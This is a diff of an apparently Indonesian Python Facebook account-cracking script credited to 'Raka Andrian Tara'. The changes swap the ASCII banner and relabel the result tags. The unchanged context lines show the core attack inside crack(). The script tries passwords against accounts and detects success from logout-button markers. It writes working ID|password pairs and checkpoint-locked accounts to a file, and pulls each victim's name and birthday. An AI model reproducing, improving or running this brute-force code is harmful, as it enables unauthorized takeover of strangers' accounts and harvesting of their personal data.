@@ -61,16 +61,15 @@ def jalan(z):
 		time.sleep(00.1)
 
 rafi_logo = '''
-\x1b[1;96m _______           _______  _______   
-\x1b[1;96m|  ____ \|\     /||  ___  ||       |  
-\x1b[1;96m| (    \/( \   / )| (   ) || () () |  
-\x1b[1;96m| (_____  \ (_) / | (___) || || || |   
-\x1b[1;96m(_____  )  \   /  |  ___  || |(_)| |  
-\x1b[1;96m      ) |   ) (   | (   ) || |   | |  
-\x1b[1;96m/\____) |   | |   | )   ( || )   ( | 
-\x1b[1;96m\_______)   \_/   |/     \||/     \|  
-\x1b[1;101m\x1b[1;97mCreated By : Raka Andrian Tara
-7 November 2021\x1b[0m
+\x1b[1;96m _______  _______  _______  __    __  ______    _______ 
+\x1b[1;96m|  ___  ||       ||  ___  ||  \  |  ||  ___  ) |  ___  |
+\x1b[1;96m| (   ) || () () || (   ) ||   \ |  || |    ) || (   ) |
+\x1b[1;96m| (___) || || || || (___) ||    ()  || |    | || (___) |
+\x1b[1;96m|  ___  || |(_)| ||  ___  || ()     || |    | ||  ___  |
+\x1b[1;96m| (   ) || |   | || (   ) || | \    || |    | || (   ) |
+\x1b[1;96m| )   ( || )   ( || )   ( || )    ( || |___ ) || )   ( |
+\x1b[1;96m|/     \||/     \||/     \||/      \||______ ) |/     \|
+\x1b[1;101m\x1b[1;97mCreated By : Raka Andrian Tara 1 Januari 2022\x1b[0m
 __________________________________________________
 '''
 
@@ -243,7 +242,7 @@ def crack():
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
 					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
 					ok.append(rax_x+'|'+pw)
-					save.write('  [ OK ] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('  [RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -254,17 +253,17 @@ def crack():
 						data = s.get(url).json()
 						tgllhr = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \x1b[1;96m[ CP ] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
+						print('\r  \x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
 						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
-						save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
+						save.write('  [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						tgllhr = " "
 					except:pass
-					print('\r  \x1b[1;96m [ CP ] ' +rax_x+ ' <-> ' + pw + '       ')
+					print('\r  \x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
 					cp.append(rax_x+'|'+pw)
-					save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+'\n')
+					save.write('  [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
 					save.close()
 					break
 					continue
